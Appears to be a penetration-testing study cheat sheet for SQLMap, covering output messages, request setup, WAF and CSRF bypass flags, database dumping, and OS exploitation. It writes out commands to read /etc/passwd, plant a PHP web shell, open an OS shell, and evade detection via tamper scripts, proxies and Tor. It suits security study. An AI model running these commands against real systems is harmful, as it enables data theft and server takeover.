# SQLMAP - Automated SQLi Injections and Tests 

## General 
SQLMap generally requires `parameters` to garget specific parts of a web application where SQLi vulnerabilities may exist.  
For instance, below is a basic example of how to use SQLMap with a url -u and a parameter. The id=5 is the parameter being tested for SQLi:  
  `python sqlmap.py -u 'http://testsite.com/index.php?id=5`

## Helpful Resources
* https://hackertarget.com/sqlmap-tutorial/

## Output Description
After starting the SQLMap process, data will be shown as the test progresses. This data is crucial to understand, because it guides us through the automated SQLi process.  
It also shows us exactly what kind of vulnerabilities SQLMap is exploiting.  
* `target URL content is stable`
  * No major changes between responses in case of continuous identical requests.
  * This is important, because stability allows SQLMap to spot differences caused by potential SQLi attempts.
* `GET parameter 'id' appears to be dynamic`
  * It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in response; hence the parameter may be linked to a database.
  * If the parameter was "static," it would be an indication that the tested parameter is not processed by the target
* `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MYSQL')`
  * This is not proof of SQLi, just an indication that the detection mechanism has to be proven in the subsequent run
* `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks`
  * While it's not its primary purpose, SQLMap also runs a quick test for the existence of an XSS vulnerability
* `it looks like the back-end DBMS is "MySQL". Do you want to skip test payloads specific for other DMSes? [Y/n]`
  * In a normal run, it tests for all support DBMSes. But if there is a clear indication that the target is using a specific DBMS, we can narrow it down to the payloads specific to that DBMS to save time
* `for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) [Y/n]`
  * Related to the previous log message, it is also possible to extend the tests for the same specific DBMS beyond the regular tests.
  * `Level`: Indicates the depth or complexity of a test, with higher levels typically being more intrusive or time-consuming.
  * `Risk`: Represents the potential impact or severity of running the test, with higher risk potentially causing disruptions or unintended changes.
* `reflective value(s) found and filtering out`
  * Warning that parts of the used payload was found in the response. This is considered to be "noise" and will cause issues to the automation process. However, SQLMap has filtering mechanisms to remove such junk.
* `GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")`
  * The parameter appears injectable, but there’s a chance of false positives, especially in boolean-based or time-based blind SQLi tests.
  * At the end of the run, SQLMap performs additional logic checks to eliminate false positives.
  * The use of `--string="luther"` indicates SQLMap relied on the constant string luther in the response to distinguish TRUE from FALSE.
  * This approach avoids advanced mechanisms like dynamicity/reflection removal or fuzzy comparison, reducing the risk of false positives.
* `time-based comparison requires a larger statistical model, please wait........... (done)`
* `automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found`
  * UNION-query SQLi checks require significantly more requests compared to other SQLi types for successful payload recognition.
  * To reduce testing time, the number of requests is capped at 10 if the target does not seem injectable.
  * If there’s a high chance of vulnerability, especially when another SQLi technique is detected, SQLMap increases the number of requests for UNION-query SQLi to improve the likelihood of success.
* `ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test`
  * Before the UNION payloads are sent, a technique known as `ORDER BY` is checked for usability.
  * In case that it is usable, SQLMap can gather the correct number of columns required for the UNION payloads
* `GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`
  * This is an extremely important message from SQLMap.
  * Means taht the parameter was found to be vulnerable to SQLi.
* `sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:`
  * Following this statement is a list of all injection points with type, title and payloads, which is the final proof of successful detection and exploitation of SQLi vulnerabilities.
  * It should be noted that SQLMap only lists the findings where they are proven to be exploitable (usable).

## Setup
It's extremely easy to make mistakes when setting up your SQLMap load, such as forgetting to provide proper cookie values, over-complicating setup with a lengthy command line, or even improper declaration of formatted POST data.  You can prevent this by utilizing `cURL` commands or `full HTTP requests`:  
* `cURL`
  * One of the best and easiest ways to properly set up an SQLMap Request
  * You can use this by utilizing the `copy as cURL` feature within the Network panel inside of a browser's developer tools
  * Copy and paste the cURL commmand and replace `curl` with `sqlmap`
* `Full HTTP Requests`
  * If you need to specify a complex HTTP request with a lot of unique header values and a long POST body, you can utilize the `-r` option.
  * > sqlmap -r requirements.txt
  * This allows you to provide SQLMap with a request file, containing the whole HTTP request inside of a single text file.
  * You can get this through a proxy (`such as burp suite`). Make sure to intercept the request -> right-click + copy to file

## GET/POST Requests
* `GET`
  * Typically in a GET request, the parameters needed for testing are within the URL itself:
    > sqlmap -u http://test.com/index.php?id=5
* `POST`
  * For POST requests, you can utilize the `--data` option within SQLMap:
    > sqlmap -u http://test.com/index.php --data 'id=1&name=admin'

## Helpful Options and Flags
You can find the documentation for SQLMap by `SQLMap Github -> Wiki -> Usage` or by utilizing `sqlmap --hh` in the command line  
* `--batch`: Run SQLMap without asking for user input
* `--cookie`: Specify a cookie header
* `-t /path/to/file`: Store traffic into an output file
* `-v [pick a number 1-6]`: Specify verbosity level, default is 1
* `--prefix="enter prefix"`: Specify a prefix in front of each vector/payload
* `--suffix="enter suffix"`: Specify a suffix in front of each vector/payload
* `--level=[1-5]`: Specify the level of payload
  > Remember that `level` is how complex each payload is
* `--risk=[1-3]`: Specify the risk of payload
  > Remember that `risk` is how "dangerous" each payload is
* `--no-cast`: Prevents SQLMap from attempting data-type casting.
* `--tamper`: Get around filtering mechanisms or WAF
  > --tamper=space2comment -> replaces spaces with comments to bypass spacing filtering
* `--threads`: set the number of concurrent threads (requests) that SQLMap should use during testing. This can speed up the process of detecting SQL injection vulnerabilities by running multiple tests at the same time. Max is 10. 

## Tamper
The `--tamper` option in SQLMap is used to modify SQL injection payloads to bypass web application filters or WAFs (Web Application Firewalls). It applies tamper scripts that alter the payloads, making them less detectable.  
Common --tamper Scripts:
`space2comment` – Replaces spaces with SQL comments (/**/).
`space2dash` – Replaces spaces with a dash comment (--).
`charunicodeescape` – Encodes payloads using Unicode escape sequences.
`between` – Replaces = with BETWEEN.
`randomcase` – Randomizes the uppercase/lowercase letters in SQL keywords.
`apostrophemask` – Masks single quotes (') with SQL comments.
`equaltolike` – Replaces = with LIKE.
`percentencode` – URL-encodes characters.
`unmagicquotes` – Bypasses magic quotes in PHP environments.

## Bypassing Web Application Protections
* `CSRF (Cross-Site Request Forgery)` is an attack where a malicious actor tricks a user into submitting a request that performs an action on a website without the user's consent.
  * Anti-CSRF: Web apps often use anti-CSRF tokens in HTTP requests (usually in POST data or headers) to prevent automated attacks. To bypass CSRF checks, use the `--csrf-token` option.
    > sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

* `Unique Value Bypass` involves web applications requiring unique values (like session IDs or random strings) in parameters for each request. To get around this, use the `--randomize` option.
  * To identify if a web application uses `Unique Value Bypass`, look for parameters in the URL query string, POST data, or headers that require dynamically changing values with every request. Common signs include:
    * Repeated Failed Requests
    * Parameter Patterns: look for parameters that change on every valid request
    > sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI

  * `Calculated Parameters` is where a web application expects a proper parameter to be calculated based on some other parameter value. For example:
    * `id` can be one parameter
    * `h` can be another parameter
    * the `calculation` means the second parameter (h) is generated using the first parameter (id) with a formula (like MD5(id))
    * To bypass this, the option `--eval` should be used, where a valid Python code is being evaluated just before the request is being sent to the target
      > sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI

    * You can confirm the need of `--eval` if:
      * Change one parameter (id) and see if the (h) must change too
      * Look for patterns: Does h change predictably when id changes?
      * If you're not sure, you can test by trying hashes (like MD5 or SHA1) of the id value
        > Remember that for `MD5 hashes` they are:
          * 32 characters long
          * contains only hexadecimal characters 0-9 and a-f
* `--proxy` is used to set a proxy: `--proxy="socks4://177.39.187.70:33283"`
  * You can also use `--proxy-file` to provide a list of proxies, and SQLMap will cycle through them and skip `blacklisted` IPs automatically
  * You can also use `--tor` to make SQLMap automatically detect and use the local Tor Proxy. Make sure to use `--check-tor` to ensure Tor is working properly
* By default, SQLMap sends payloads to check for the existence of `WAFs (Web Application Firewalls)`. If we wanted to skip the test altogether to produce less noise, we can use switch `--skip-waf`
* Sometimes web applications can/will blacklist certain `user-agents`. In order to bypass this, you can use `--random-agent` which replaces the default user-agent value with a `random, browser-like User-Agent string` from a large pool.
  * It's important to note that even with a bypass, further protection methods might still cause issues, because security systems are constantly evolving, reducing exploitable weaknesses
* Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the `Chunked transfer encoding`, turned on using the switch `--chunked`, which splits the POST request's body into so-called "chunks." `Blacklisted SQL keywords` are split between chunks in a way that the request containing them can pass unnoticed.
* The other bypass mechanisms is the `HTTP parameter pollution (HPP)`, where payloads are split in a similar way as in case of --chunked between `different same parameter named values` (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).

## Gathering Data
You can gather a lot of data through SQLMap and even specify what kind of data you're looking for:  

  
This will perform basic `DB enumeration`:    
* `--banner` extracts DB type and version
* `--current-user` extracts current user of the DB
* `--is-dba` checks to see if current user is an administrator
> sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

This will perform `table enumeration`:  
* `--tables` retrieves table names
* `-D [enter database name here]` specifies the database
> sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

This will extract raw data from the specified database.table.column:
* `--dump` retrieves and display the contents once an injection vulnerability is confirmed
* `-T` specifies the table
* `-D` specifies the database
* `-C` specifies the column(s)
> sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

This will perform `DB schema enumeration`:  
* `--schema` retrieves the database schema, including information about the tables and columns within the database
> sqlmap -u "http://www.example.com/?id=1" --schema

You can `search` for data: 
* `--search` used to search for a specific keyword (like a table name or column) in the database
> sqlmap -u "http://www.example.com/?id=1" --search -T users

You can filter data based on `conditional statements`:  
* `--where`: used to filter data based on a conditional statement (like SQL's WHERE clause)
* The example below filters the data for names that start with an 'f':
> sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

This will extract `binary data`:  
* `--binary-fields="[Enter field/column]"` tells SQLMap to treat the specified field as binary data, allowing it to extract and handle that field accordingly
> sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --binary-fields="digest"

## OS Exploitation with SQLMap

### 1. **File Read/Write**
- **Goal**: Utilize SQL Injection to read and write files on the hosting server.
- **File Reading**: Common, requires DB user privileges like `LOAD DATA` and `INSERT` to read local files (e.g., `/etc/passwd`).
  - Example command:  
    `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`
- **Privileges**: DBA privileges are not always required, but helpful. Without DBA access, file reading can be blocked.
- **Check for DBA Privileges**: Use `--is-dba` option in SQLMap.
  - Example:
    ```bash
    sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
    ```

### 2. **Reading Local Files**
- **SQLMap Command**: Use `--file-read` to read files from the server.
  - Example:
    ```bash
    sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
    ```
- **Output**: SQLMap saves the file locally, confirming successful file retrieval.
  - Example:
    ```bash
    cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
    ```

### 3. **Writing Local Files**
- **File Writing**: More restricted in modern DBMS to prevent web shell uploads.
  - Requires DBA privileges or specific settings like `--secure-file-priv` disabled.
- **Test File Writing**: Use `--file-write` and `--file-dest` options to upload files.
  - Example:
    ```bash
    sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
    ```
- **PHP Shell**: Create a basic PHP web shell (`<?php system($_GET["cmd"]); ?>`) to get command execution.

### 4. **OS Command Execution**
- **OS Shell via SQLMap**: Use `--os-shell` to gain command execution on the server.
  - Example:
    ```bash
    sqlmap -u "http://www.example.com/?id=1" --os-shell
    ```
- **SQLMap’s Functionality**: Uses techniques like UDFs (User Defined Functions) to execute OS commands remotely.

### 5. **Server Webroot Discovery**
- **Finding Webroot**: If unknown, SQLMap can automatically attempt to find the server's webroot.
  - **Method**: Use a default list of common locations (`/var/www/`, `/var/www/html/`) or brute-force search.
  - SQLMap will ask for confirmation when it finds the webroot, or you can specify a custom location.

### 6. **Interactive OS Shell**
- **Interactive Mode**: Once the shell is active, you can interact with the remote server, e.g., running `ls -la` to list files.
  - Example:
    ```bash
    os-shell> ls -la
    ```

### 7. **Notes**
- SQLMap can utilize different methods to exploit SQL injection vulnerabilities and interact with the OS.
- Modern DBMSs restrict file-write operations to avoid unauthorized access, but file-read operations are often feasible when privileges are granted.
- Automatic webroot discovery helps in targeting common server paths when writing files.
